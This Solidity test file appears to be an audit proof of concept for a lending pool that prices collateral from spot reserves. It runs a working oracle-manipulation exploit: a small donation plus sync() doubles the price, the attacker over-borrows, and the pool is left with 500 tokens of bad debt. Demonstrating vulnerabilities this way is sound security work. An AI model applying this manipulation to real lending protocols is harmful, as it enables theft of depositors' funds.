// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/LendingPool.sol";
import "../src/SimplePair.sol";
import "../src/IERC20.sol";
import "./Helpers.sol";

/// @notice Attacker account separate from the pool owner.
contract Borrower {
    function approve(MockERC20 t, address s, uint256 a) external { t.approve(s, a); }
    function deposit(LendingPool p, uint256 a) external { p.depositCollateral(a); }
    function borrow(LendingPool p, uint256 a) external { p.borrow(a); }
    function transfer(MockERC20 t, address to, uint256 a) external { t.transfer(to, a); }
    function setPair(LendingPool p, SimplePair np) external { p.setPair(np); }
}

contract LendingPoolOracleTest {
    // Issue 2: collateral is priced from the pair's SPOT reserves, which are
    // manipulable via a donation + public sync(). A borrower can then borrow
    // more than its collateral is worth at the undistorted price.
    function test_spotPriceManipulationOverBorrow() external {
        MockERC20 token0 = new MockERC20("COL"); // collateral
        MockERC20 token1 = new MockERC20("DEBT"); // debt token
        SimplePair pair = new SimplePair(token0, token1);

        // Undistorted pair: reserves 10 : 10 => true price 1e18 (1 collateral == 1 debt).
        token0.mint(address(pair), 10e18);
        token1.mint(address(pair), 10e18);
        pair.sync();
        LendingPool pool = new LendingPool(token0, token1, pair);

        uint256 truePrice = pool.price();
        require(truePrice == 1e18, "true price 1:1");

        // Fund the pool with debt tokens to lend.
        token1.mint(address(pool), 2_000e18);

        // Attacker deposits 1000 collateral. At the TRUE price it is worth 1000 debt tokens.
        Borrower attacker = new Borrower();
        token0.mint(address(attacker), 1_000e18);
        attacker.approve(token0, address(pool), 1_000e18);
        attacker.deposit(pool, 1_000e18);

        // --- Manipulate the oracle: donate 10 debt tokens to the pair and sync() ---
        // reserves become 10 : 20 => spot price 2e18. The donation costs the attacker 10e18.
        token1.mint(address(attacker), 10e18);
        attacker.transfer(token1, address(pair), 10e18);
        pair.sync();
        require(pool.price() == 2e18, "manipulated price 2:1");

        // Now the pool values 1000 collateral at 2000 debt tokens. Max borrow at 75% LTV = 1500.
        uint256 poolBalBefore = token1.balanceOf(address(pool));
        attacker.borrow(pool, 1_500e18);
        uint256 borrowed = token1.balanceOf(address(pool)) == poolBalBefore - 1_500e18 ? 1_500e18 : 0;
        require(borrowed == 1_500e18, "borrow did not go through");

        // IMPACT at the UNDISTORTED price: collateral (1000) is worth 1000 debt tokens,
        // but the attacker borrowed 1500. If it abandons the loan, the pool is left holding
        // 1000 collateral against a 1500 debt it never recovers.
        uint256 debt = pool.debtOf(address(attacker));
        uint256 collateral = pool.collateralOf(address(attacker));
        uint256 trueCollateralValue = collateral * truePrice / 1e18; // 1000e18
        require(debt == 1_500e18, "debt");
        require(trueCollateralValue == 1_000e18, "true value");
        require(debt > trueCollateralValue, "did not over-borrow");

        uint256 poolLoss = debt - trueCollateralValue; // 500e18 bad debt
        require(poolLoss == 500e18, "pool loss 500");

        // Attacker net profit if it walks away: borrowed - collateral - donation.
        // 1500 - 1000 - 10 = 490e18 profit (manipulation is cheaper than the stolen amount
        // because the pair's reserves are small relative to the collateral).
        uint256 attackerNet = 1_500e18 - 1_000e18 - 10e18;
        require(attackerNet == 490e18, "attacker profit 490");
    }
}
